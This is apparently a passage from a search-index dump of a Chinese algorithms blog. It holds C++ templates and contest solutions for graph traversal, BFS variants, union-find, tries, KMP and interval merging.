7 8 9 10 11 12  // 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点 int h[N], e[N], ne[N], idx;  // 添加一条边a-\u0026gt;b void add(int a, int b) {  e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ; }  // 初始化 idx = 0; memset(h, -1, sizeof h);   树与图的遍历 时间复杂度 O(n+m), n 表示点数，m 表示边数\n深度优先遍历 1 2 3 4 5 6 7 8 9 10  int dfs(int u) {  st[u] = true; // st[u] 表示点u已经被遍历过   for (int i = h[u]; i != -1; i = ne[i])  {  int j = e[i];  if (!st[j]) dfs(j);  } }   树的重心 宽度优先遍历 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  queue\u0026lt;int\u0026gt; q; st[1] = true; // 表示1号点已经被遍历过 q.push(1);  while (q.size()) {  int t = q.front();  q.pop();   for (int i = h[t]; i != -1; i = ne[i])  {  int j = e[i];  if (!st[j])  {  st[j] = true; // 表示点j已经被遍历过  q.push(j);  }  } }   BFS综合\nfloodfill 城堡问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 55,M=N*N; int g[N][N]; int cnt,maxarea; bool st[N][N]; int m,n; typedef pair\u0026lt;int,int\u0026gt; PII; int dx[4]={0,-1,0,1},dy[4]={-1,0,1,0}; /* acwing 1098 4 7 11 6 11 6 3 10 6 7 9 6 13 5 15 5 1 10 12 7 13 7 5 13 11 10 8 10 12 13 5 9 */ int bfs(int i,int j){ \tint area = 0; \tqueue\u0026lt;PII\u0026gt; q; \tq.push({i,j}); \tst[i][j]=true; \twhile(q.size()){ \tPII t = q.front(); \tq.pop(); \tint a = t.first,b=t.second; \tarea++; \tfor(int k=0;k\u0026lt;4;k++){ \tint x = a+dx[k],y=b+dy[k]; \tif(x\u0026gt;=0\u0026amp;\u0026amp;x\u0026lt;m\u0026amp;\u0026amp;y\u0026gt;=0\u0026amp;\u0026amp;y\u0026lt;n\u0026amp;\u0026amp;!st[x][y]\u0026amp;\u0026amp;!(g[a][b]\u0026gt;\u0026gt;k\u0026amp;1)){ \tst[x][y]=true; \tq.push({x,y}); \t} \t} \t} \treturn area; } int main(){ \tcin\u0026gt;\u0026gt;m\u0026gt;\u0026gt;n; \tfor(int i =0;i\u0026lt;m;i++){ \tfor(int j =0;j\u0026lt;n;j++){ \tcin\u0026gt;\u0026gt;g[i][j]; \t} \t} \tfor(int i =0;i\u0026lt;m;i++){ \tfor(int j =0;j\u0026lt;n;j++){ \tif(!st[i][j]){\t\tmaxarea=max(maxarea,bfs(i,j));\t\tcnt++;\t\t} \t\t} \t} \tcout\u0026lt;\u0026lt;cnt\u0026lt;\u0026lt;endl; \tcout\u0026lt;\u0026lt;maxarea\u0026lt;\u0026lt;endl; \treturn 0; }   最短路 走迷宫 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 110; typedef pair\u0026lt;int,int\u0026gt; pii; int g[N][N],d[N][N]; int n,m; int dx[4] = {-1,0,1,0}; int dy[4] = {0,-1,0,1}; queue\u0026lt;pii\u0026gt; que; /* 5 5 0 1 0 0 0 0 1 0 1 0 0 0 0 0 0 0 1 1 1 0 0 0 0 1 0 8 */ int dfs(){ \tque.push({0,0}); \td[0][0] = 0; \twhile(que.size()){ \tpii t = que.front(); \tque.pop(); \tint a = t.first,b=t.second; \tfor(int i = 0;i\u0026lt;4;i++){ \tint x = a+dx[i]; \tint y = b+dy[i]; \tif(x\u0026gt;=0\u0026amp;\u0026amp;x\u0026lt;n\u0026amp;\u0026amp;y\u0026gt;=0\u0026amp;\u0026amp;y\u0026lt;m\u0026amp;\u0026amp;g[x][y]==0\u0026amp;\u0026amp;d[x][y]==-1){ \tque.push({x,y}); \td[x][y] = d[a][b]+1; \t} \t} \t} \treturn d[n-1][m-1]; } int main(){ \tcin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; \tfor(int i = 0;i\u0026lt;n;i++){ \tfor(int j =0;j\u0026lt;m;j++){ \tcin\u0026gt;\u0026gt;g[i][j]; \t} \t} \tmemset(d,-1,sizeof d); \tcout\u0026lt;\u0026lt;dfs()\u0026lt;\u0026lt;endl; \treturn 0; }    多源BFS 矩阵距离 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 1010; char g[N][N]; int dist[N][N]; int dx[4]={0,0,1,-1},dy[4]={1,-1,0,0}; typedef pair\u0026lt;int,int\u0026gt; PII; int n,m; /* 3 4 0001 0011 0110 3 2 1 0 2 1 0 0 1 0 0 1 */ void bfs(){ \tmemset(dist,-1,sizeof dist); \tqueue\u0026lt;PII\u0026gt; q; \tfor(int i =0;i\u0026lt;n;i++){ \tfor(int j=0;j\u0026lt;m;j++){ \tif(g[i][j]==\u0026#39;1\u0026#39;) q.push({i,j}),dist[i][j]=0; \t} \t} \twhile(q.size()){ \tPII t = q.front(); \tq.pop(); \tint a = t.first,b=t.second; \tfor(int i=0;i\u0026lt;4;i++){ \tint x = a+dx[i],y=b+dy[i]; \tif(x\u0026gt;=0\u0026amp;\u0026amp;x\u0026lt;n\u0026amp;\u0026amp;y\u0026gt;=0\u0026amp;\u0026amp;y\u0026lt;m\u0026amp;\u0026amp;dist[x][y]==-1){ \tdist[x][y]=dist[a][b]+1; \tq.push({x,y}); \t} \t} \t} } int main(){ \tcin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; \tfor(int i =0;i\u0026lt;n;i++) cin\u0026gt;\u0026gt;g[i]; \tfor(int i =0;i\u0026lt;n;i++){ \tfor(int j=0;j\u0026lt;m;j++){ \tbfs(); \t} \t} \tfor(int i =0;i\u0026lt;n;i++){ \tfor(int j=0;j\u0026lt;m;j++){ \tcout\u0026lt;\u0026lt;dist[i][j]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; \t} \tputs(\u0026#34; \u0026#34;); \t} \treturn 0; }   双端队列广搜 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  // 非常类似于dijskra #include \u0026lt;iostream\u0026gt;#include \u0026lt;cstring\u0026gt;#include \u0026lt;deque\u0026gt; #define x first #define y second  using namespace std;  typedef pair\u0026lt;int, int\u0026gt; PII;  const int N = 550;  int n, m; // 方格的数量为n * m char g[N][N]; // 存储每个方格内的数据 int dist[N][N]; // 到达每个格点需要的步数 bool st[N][N]; // 判重数组，判断该点是否已求出结果  int bfs() {   memset(dist, 0x3f, sizeof dist);  memset(st, 0, sizeof st);  dist[0][0] = 0;   deque\u0026lt;PII\u0026gt; q;  q.push_back({0, 0});   char cs[] = \u0026#34;\\\\/\\\\/\u0026#34;; // 与格点导通的四种情况  int dx[] = {-1, -1, 1, 1}, dy[] = {-1, 1, 1, -1}; // 相邻的四个格点  int ix[] = {-1, -1, 0, 0}, iy[] = {-1, 0, 0, -1}; // 与当前格点相邻的四个方格   while (q.size()) {   PII t = q.front(); q.pop_front();   if (st[t.x][t.y]) continue; // 当前点已经求出最短距离  st[t.x][t.y] = true;   for (int i = 0; i \u0026lt; 4; i++) {  int a = t.x + dx[i], b = t.y + dy[i];  if (a \u0026lt; 0 || a \u0026gt; n || b \u0026lt; 0 || b \u0026gt; m) continue;   int ca = t.x + ix[i], cb = t.y + iy[i]; // 考察与当前格点相邻的第i个方格  int w = (g[ca][cb] != cs[i]); // 不能导通，需要旋转一次  int d = dist[t.x][t.y] + w;   // 因为某个格点可能入队多次，需要更新dist[a][b]，更新后的数据需要入队  if (d \u0026lt; dist[a][b]) {  dist[a][b] = d;  if (w) q.push_back({a, b});  else q.push_front({a, b});  }  }  }   return dist[n][m]; }  int main() {   int T;  scanf(\u0026#34;%d\u0026#34;, \u0026amp;T);  while (T--) {  scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m);  for (int i = 0; i \u0026lt; n; i++) scanf(\u0026#34;%s\u0026#34;, g[i]);   if ((n + m) \u0026amp; 1) puts(\u0026#34;NO SOLUTION\u0026#34;);  else printf(\u0026#34;%d\\n\u0026#34;, bfs());  }   return 0; }   ","permalink":"https://kevinerr.github.io/posts/algorithm/bfs%E4%B8%8Edfs/","summary":"树与图的存储 树是一种特殊的图，与图的存储方式相同。 对于无向图中的边ab，存储两条有向边a-\u0026gt;b, b-\u0026gt;a。 因此我们可以只考虑有向","title":"BFS与DFS"},{"content":"思想 并查集可以理解为一种解决问题的思想，将有关系的元素合并为一个集合。\n模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  (1)朴素并查集：   int p[N]; //存储每个点的祖宗节点   // 返回x的祖宗节点  int find(int x)  {  if (p[x] != x) p[x] = find(p[x]);  return p[x];  }   // 初始化，假定节点编号是1~n  for (int i = 1; i \u0026lt;= n; i ++ ) p[i] = i;   // 合并a和b所在的两个集合：  p[find(a)] = find(b);   (2)维护size的并查集：   int p[N], size[N];  //p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量   // 返回x的祖宗节点  int find(int x)  {  if (p[x] != x) p[x] = find(p[x]);  return p[x];  }   // 初始化，假定节点编号是1~n  for (int i = 1; i \u0026lt;= n; i ++ )  {  p[i] = i;  size[i] = 1;  }   // 合并a和b所在的两个集合：  size[find(b)] += size[find(a)];  p[find(a)] = find(b);   (3)维护到祖宗节点距离的并查集：   int p[N], d[N];  //p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离   // 返回x的祖宗节点  int find(int x)  {  if (p[x] != x)  {  int u = find(p[x]);  d[x] += d[p[x]];  p[x] = u;  }  return p[x];  }   // 初始化，假定节点编号是1~n  for (int i = 1; i \u0026lt;= n; i ++ )  {  p[i] = i;  d[i] = 0;  }   // 合并a和b所在的两个集合：  p[find(a)] = find(b);  d[find(a)] = distance; // 根据具体问题，初始化find(a)的偏移量   合并集合 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  #include\u0026lt;iostream\u0026gt;using namespace std;  const int N = 100010;  int n,m; int p[N];  int find(int x) //返回x的祖宗结点 + 路径压缩 {  if(p[x] != x) p[x] = find(p[x]);  return p[x]; }  int main() {  scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;m);  for(int i=1;i\u0026lt;=n;i++)  p[i] = i;  while(m--)  {  char op[2];  int a,b;  scanf(\u0026#34;%s%d%d\u0026#34;,op,\u0026amp;a,\u0026amp;b);  if (op[0] == \u0026#39;M\u0026#39;)  p[find(a)] = find(b);  else  {  if (find(a) == find(b)) puts(\u0026#34;Yes\u0026#34;);  else puts(\u0026#34;No\u0026#34;);  }  }  return 0; }   连通块中点的数量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  //本次思路即为合并集合的稍微变形 #define _CRT_SECURE_NO_WARNINGS 1 #include\u0026lt;iostream\u0026gt;using namespace std; const int N = 100010; int n, m; int p[N]; int siz[N]; int find(int x)//合并集合并且压缩路径 { \tif (p[x] != x) p[x] = find(p[x]); \treturn p[x]; } int main() { \tscanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); \tfor (int i = 1; i \u0026lt;= n; i++) \t{ \tp[i] = i; \tsiz[i] = 1; \t} \twhile (m--) \t{ \tchar op[2]; \tint a, b; \tscanf(\u0026#34;%s\u0026#34;, op); \tif (op[0] == \u0026#39;C\u0026#39;) \t{ \tscanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); \tif (find(a) == find(b)) continue;//当ab已经为同一根节点是，跳出本次循环继续下次循环 \tsiz[find(b)] += siz[find(a)];//尺度合并 \tp[find(a)] = find(b);//合并两个集合 \t} \telse if (op[1] == \u0026#39;1\u0026#39;) \t{ \tscanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); \tif (find(a) == find(b)) printf(\u0026#34;Yes\\n\u0026#34;); \telse printf(\u0026#34;No\\n\u0026#34;); \t} \telse \t{ \tscanf(\u0026#34;%d\u0026#34;, \u0026amp;a); \tprintf(\u0026#34;%d\u0026#34;, siz[find(a)]); \t} \t} \treturn 0; }   银河英雄传说 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; int sz[30010],d[30010],fa[30010]; int find(int x) {  if(fa[x]!=x)  {  int root=find(fa[x]);  d[x]+=d[fa[x]];  fa[x]=root;  }  return fa[x]; } int main() {  int t;  for(int i=0;i\u0026lt;30010;i++) d[i]=0,sz[i]=1,fa[i]=i;   cin\u0026gt;\u0026gt;t;  while(t--){  char op;  int a,b;  cin\u0026gt;\u0026gt;op\u0026gt;\u0026gt;a\u0026gt;\u0026gt;b;  //scanf(\u0026#34;%s%d%d\u0026#34;,op,\u0026amp;a,\u0026amp;b);  int pa=find(a),pb=find(b);  if(op==\u0026#39;M\u0026#39;){  if(pa!=pb)  {  fa[pa]=pb;  d[pa]=sz[pb];  sz[pb]+=sz[pa];  }  }  else{  if(pa!=pb) cout\u0026lt;\u0026lt;-1\u0026lt;\u0026lt;endl;  else printf(\u0026#34;%d\\n\u0026#34;,max(0,abs(d[a]-d[b])-1));  }  }  return 0; }   奇偶游戏\n食物链\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E5%B9%B6%E6%9F%A5%E9%9B%86/","summary":"思想 并查集可以理解为一种解决问题的思想，将有关系的元素合并为一个集合。 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33","title":"并查集"},{"content":"模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  int son[N][26], cnt[N], idx; // 0号点既是根节点，又是空节点 // son[][]存储树中每个节点的子节点 // cnt[]存储以每个节点结尾的单词数量  // 插入一个字符串 void insert(char *str) {  int p = 0;  for (int i = 0; str[i]; i ++ )  {  int u = str[i] - \u0026#39;a\u0026#39;;  if (!son[p][u]) son[p][u] = ++ idx;  p = son[p][u];  }  cnt[p] ++ ; }  // 查询字符串出现的次数 int query(char *str) {  int p = 0;  for (int i = 0; str[i]; i ++ )  {  int u = str[i] - \u0026#39;a\u0026#39;;  if (!son[p][u]) return 0;  p = son[p][u];  }  return cnt[p]; }   Trie字符串统计 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #include \u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int MAXN = 1e5 + 5; int seg[MAXN][26], cnt[MAXN * 26], idx; void Insert(char *str) {  int u = 0;  for (int i = 0; str[i]; i++) {  int v = str[i] - \u0026#39;a\u0026#39;;  if (!seg[u][v])  seg[u][v] = ++idx;  u = seg[u][v];  }  cnt[u]++; } int Query(char *str) {  int u = 0;  for (int i = 0; str[i]; i++) {  int v = str[i] - \u0026#39;a\u0026#39;;  if (!seg[u][v])  return 0;  u = seg[u][v];  }  return cnt[u]; } int main() {  int n;  char op, str[MAXN];  scanf(\u0026#34;%d\u0026#34;, \u0026amp;n);  while (n--) {  scanf(\u0026#34; %c %s\u0026#34;, \u0026amp;op, str);  if (op != \u0026#39;Q\u0026#39;)  Insert(str);  else printf(\u0026#34;%d\\n\u0026#34;, Query(str));  }  return 0; }   前缀统计 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 1e6+5; int son[N][26], cnt[N], idx; string s; int n,m; void insert(string str){  int p =0;  for(int i =0;i\u0026lt;str.size();i++){  int u = str[i]-\u0026#39;a\u0026#39;;  if(!son[p][u]) son[p][u]=++idx;  p=son[p][u];  }  cnt[p]++; } int query(string str){  int res=0;  int p =0;  for(int i =0;i\u0026lt;str.size();i++){  int u = str[i]-\u0026#39;a\u0026#39;;  p=son[p][u];  if (p == 0) return res;  res += cnt[p];  }  return res; } int main() {  cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m;  while (n -- ){  cin\u0026gt;\u0026gt;s;  insert(s);  }  while (m -- ){  cin\u0026gt;\u0026gt;s;  int res = query(s);  cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl;  }  return 0; }   最大异或对（好题） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 1e5+5,M=31*N; int a[N]; int son[M][2],idx=0; int n; void insert(int t){  int p = 0;  for(int i =30;i\u0026gt;=0;i--){  int u = t\u0026gt;\u0026gt;i\u0026amp;1;  if(!son[p][u]) son[p][u]=++idx;  p=son[p][u];  } } int query(int t){  int p = 0,res=0;  for(int i =30;i\u0026gt;=0;i--){  int u = t\u0026gt;\u0026gt;i\u0026amp;1;  if(son[p][!u]){  p=son[p][!u];  res=res*2+1;  }  else{  p=son[p][u];  res=res*2+0;  }  }  return res; } int main() {  cin\u0026gt;\u0026gt;n;  int res = 0;  idx=0;  for (int i = 0; i \u0026lt; n; i ++ ){  cin\u0026gt;\u0026gt;a[i];  insert(a[i]);  }  for (int i = 0; i \u0026lt; n; i ++ ){  res=max(res,query(a[i]));  }  cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl;  return 0; }   电话列表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; int t,n; const int N = 100000; int son[N][10],idx,cnt[N]; string a[N]; bool flag; void insert(string s){  int p =0;  for(int i=0;i\u0026lt;s.size();i++){  int u = s[i]-\u0026#39;0\u0026#39;;  if(!son[p][u]) son[p][u]=++idx;  p=son[p][u];  if(cnt[p]) flag=false;  }  cnt[p]++;  } int main() {  cin\u0026gt;\u0026gt;t;  while(t--){  cin\u0026gt;\u0026gt;n;  for(int i =0;i\u0026lt;n;i++){  cin\u0026gt;\u0026gt;a[i];  }  sort(a,a+n);  flag = true;  for(int i =0;i\u0026lt;n;i++){  insert(a[i]);  }  if(flag){  cout\u0026lt;\u0026lt;\u0026#34;YES\u0026#34;\u0026lt;\u0026lt;endl;  }else{  cout\u0026lt;\u0026lt;\u0026#34;NO\u0026#34;\u0026lt;\u0026lt;endl;  }  idx=0;  memset(cnt, 0, sizeof cnt);  memset(son, 0, sizeof son);  }   return 0; }   最长异或值路径 ","permalink":"https://kevinerr.github.io/posts/algorithm/trie/","summary":"模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 int son[N][26], cnt[N], idx; // 0号点既是根节点，又是空节点 // son[][]存储树中每个节点的子节","title":"Trie"},{"content":"模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // s[]是长文本，p[]是模式串，n是s的长度，m是p的长度 求模式串的Next数组： for (int i = 2, j = 0; i \u0026lt;= m; i ++ ) {  while (j \u0026amp;\u0026amp; p[i] != p[j + 1]) j = ne[j];  if (p[i] == p[j + 1]) j ++ ;  ne[i] = j; }  // 匹配 for (int i = 1, j = 0; i \u0026lt;= n; i ++ ) {  while (j \u0026amp;\u0026amp; s[i] != p[j + 1]) j = ne[j];  if (s[i] == p[j + 1]) j ++ ;  if (j == m)  {  j = ne[j];  // 匹配成功后的逻辑  } }   KMP字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  #include \u0026lt;iostream\u0026gt; using namespace std;  const int N = 100010, M = 10010; //N为模式串长度，M匹配串长度  int n, m; int ne[M]; //next[]数组，避免和头文件next冲突 char s[N], p[M]; //s为模式串， p为匹配串  int main() {  cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; s + 1 \u0026gt;\u0026gt; m \u0026gt;\u0026gt; p + 1; //下标从1开始   //求next[]数组  for(int i = 2, j = 0; i \u0026lt;= m; i++)  {  while(j \u0026amp;\u0026amp; p[i] != p[j + 1]) j = ne[j];  if(p[i] == p[j + 1]) j++;  ne[i] = j;  }  //匹配操作  for(int i = 1, j = 0; i \u0026lt;= n; i++)  {  while(j \u0026amp;\u0026amp; s[i] != p[j + 1]) j = ne[j];  if(s[i] == p[j + 1]) j++;  if(j == m) //满足匹配条件，打印开头下标, 从0开始  {  //匹配完成后的具体操作  //如：输出以0开始的匹配子串的首字母下标  //printf(\u0026#34;%d \u0026#34;, i - m); (若从1开始，加1)  j = ne[j]; //再次继续匹配  }  }   return 0; }   周期 奶牛矩阵 匹配统计 ","permalink":"https://kevinerr.github.io/posts/algorithm/kmp/","summary":"模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // s[]是长文本，p[]是模式串，n是s的长度，m是p的长度 求模式串的Next数组： for (int i = 2, j","title":"Kmp"},{"content":"十三号星期五\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  #include \u0026lt;bits/stdc++.h\u0026gt;using namespace std; int main() {  int n;  cin \u0026gt;\u0026gt; n;  int a[7] = {0};//记录星期出现次数  int week = 1;  for (int y = 1900; y \u0026lt; 1900 + n ; y++)  {  for (int m = 1; m \u0026lt;= 12; m++)  {  int d;  if (m == 1 || m == 3 || m == 5 || m == 7 || m == 8 || m == 10 || m == 12)//根据年与月算该月有多少天  {  d = 31;  }  else if (m == 2)  {  if ((y % 100 != 0 \u0026amp;\u0026amp; y % 4 == 0) || (y % 400 == 0))  d = 29;  else d = 28;  }  else  d = 30;  for (int i = 1; i \u0026lt;= d; i++)  {  week++;  if (i == 13)//如果是 13 号，对应的星期出现次数加 1  a[week % 7] ++;   }  }  }  for (int i = 0; i \u0026lt; 7; i++) cout \u0026lt;\u0026lt; a[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;;  cin \u0026gt;\u0026gt; n; }   蛇形矩阵\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #include \u0026lt;iostream\u0026gt;#include \u0026lt;cstring\u0026gt;#include \u0026lt;cstdio\u0026gt; using namespace std;  const int maxn = 150; int a[maxn][maxn];  int main() {  int n, m;  cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m;   memset(a, 0, sizeof(a));  int x = 0, y = 0; //初始坐标坐标，（0,0）  int cnt = 1; //初始化第一个数  a[x][y] = cnt;   while (cnt \u0026lt; n * m )  {  //用下一笔的位置来判断  //向右， 符合条件，则填入下一笔。____提前预判  while (y + 1 \u0026lt; m \u0026amp;\u0026amp; !a[x][y + 1]) a[x][ ++ y] = ++ cnt;  //向下  while (x + 1 \u0026lt; n \u0026amp;\u0026amp; !a[x + 1][y]) a[ ++ x][y] = ++ cnt;  //向左  while (y - 1 \u0026gt;= 0 \u0026amp;\u0026amp; !a[x][y - 1]) a[x][ -- y] = ++ cnt;  //向上  while (x - 1 \u0026gt;= 0 \u0026amp;\u0026amp; !a[x - 1][y]) a[ -- x][y] = ++ cnt;  }  for (int i = 0; i \u0026lt; n; i ++ )  {  for (int j = 0; j \u0026lt; m; j ++ )  {  cout \u0026lt;\u0026lt; a[i][j] \u0026lt;\u0026lt; \u0026#34; \u0026#34;;  // printf(\u0026#34;%-5d\u0026#34;, a[i][j]);  }  cout \u0026lt;\u0026lt; endl;  }   return 0; }   ","permalink":"https://kevinerr.github.io/posts/algorithm/2021%E5%AF%92%E5%81%87%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E5%85%A5%E9%97%A8%E7%BB%84/","summary":"十三号星期五 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;bits/stdc++.h\u0026gt;using namespace std; int main() { int n; cin \u0026gt;\u0026gt; n; int a[7] = {0};//记录星期出现","title":"2021寒假每日一题入门组"},{"content":"https://www.acwing.com/problem/search/1/?csrfmiddlewaretoken=A6hJmK9QIKhI2BjKpv9ngRnfmmlSDTEY6DjbNvDxBtLwn1nSLHtW0NrLCd6KKoSn\u0026amp;search_content=%E5%8C%BA%E9%97%B4%E5%90%88%E5%B9%B6\n思想 一、简述 区间合并 就是将坐标轴中两个存在交集 的区间合并 成一个 区间 。\n二、 思想 1.将所有 区间 按左端点从小到大排序 2.从左到右遍历每个 区间 ，把有交集 的区间合并 如果前一个右端点 小于下一个左端点。\n模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // 将所有存在交集的区间合并 void merge(vector\u0026lt;PII\u0026gt; \u0026amp;segs) {  vector\u0026lt;PII\u0026gt; res;   sort(segs.begin(), segs.end());   int st = -2e9, ed = -2e9;  for (auto seg : segs)  if (ed \u0026lt; seg.first)  {  if (st != -2e9) res.push_back({st, ed});  st = seg.first, ed = seg.second;  }  else ed = max(ed, seg.second);   if (st != -2e9) res.push_back({st, ed});   segs = res; }   区间合并 校门外的树 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; vector\u0026lt;PII\u0026gt; segs; int l,m; int res; void merge(vector\u0026lt;PII\u0026gt; \u0026amp;segs){  res = l+1;  sort(segs.begin(),segs.end());  int st = -2e9,ed=-2e9+10;  for(auto seg : segs){  if(ed\u0026lt;seg.first){  if(st!=-2e9){  res=res-(ed-st+1);  }  st=seg.first;  ed=seg.second;  }else{  ed = max(ed,seg.second);  }  }  if (st != -2e9) res=res-(ed-st+1); } int main() {  cin\u0026gt;\u0026gt;l\u0026gt;\u0026gt;m;  while(m--){  int a,b;  cin\u0026gt;\u0026gt;a\u0026gt;\u0026gt;b;  segs.push_back({a,b});  }  merge(segs);  cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl;  return 0; }   挤牛奶 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; vector\u0026lt;PII\u0026gt; segs; int res1,res2; int n; void merge(vector\u0026lt;PII\u0026gt; \u0026amp;segs){  sort(segs.begin(),segs.end());  int st=-2e9,ed=-2e9+10;  for(auto seg:segs){  if(ed\u0026lt;seg.first){  if(st!=-2e9){  res2=max(res2,seg.first-ed);  res1=max(res1,ed-st);  }  st=seg.first;  ed=seg.second;  }else{  ed=max(ed,seg.second);  }  }  if(st!=-2e9){  res1=max(res1,ed-st);  } } int main() {  cin\u0026gt;\u0026gt;n;  while(n--){  int a,b;  cin\u0026gt;\u0026gt;a\u0026gt;\u0026gt;b;  segs.push_back({a,b});  }  merge(segs);  cout\u0026lt;\u0026lt;res1\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;res2\u0026lt;\u0026lt;endl;  return 0; }   救生员 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int N = 110; PII segs[N]; int n,res; int main() {  cin\u0026gt;\u0026gt;n;  for(int i =0;i\u0026lt;n;i++){  cin\u0026gt;\u0026gt;segs[i].first\u0026gt;\u0026gt;segs[i].second;  }  sort(segs,segs+n);  for(int i =0;i\u0026lt;n;i++){  int st=-1,ed=-1,sum=0;  for(int j =0;j\u0026lt;n;j++){  if(i!=j){  if(ed\u0026lt;segs[j].first){  if(st!=-1) sum+=ed-st;  st=segs[j].first;  ed=segs[j].second;  }  else ed = max(ed,segs[j].second);  }  }  if(st!=-1) sum+=ed-st;  res=max(res,sum);  }  cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl;  return 0; }   改变数组元素 